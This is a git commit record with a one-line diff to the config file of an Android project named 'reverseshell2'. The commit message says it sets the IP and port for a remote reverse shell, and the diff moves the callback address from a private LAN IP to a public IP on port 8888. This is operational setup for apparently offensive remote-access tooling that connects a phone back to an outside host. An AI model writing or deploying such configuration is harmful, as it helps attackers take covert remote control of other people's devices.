e380e98e7238814ff7a7096a5cbf804c85c3ef8c
kirito108383 <perhue612@gmail.com>
2026-05-28 08:36:26 +0000

    Configure IP and port for remote reverse shell and ensure gradlew executable

--- Android_Code/app/src/main/java/com/example/reverseshell2/config.java
+++ Android_Code/app/src/main/java/com/example/reverseshell2/config.java
@@ -1,7 +1,7 @@
 package com.example.reverseshell2;
 
 public class config {
-    public static String IP = "192.168.0.105";
+    public static String IP = "201.92.103.156";
     public static String port = "8888";
     public static boolean icon = true;
 }
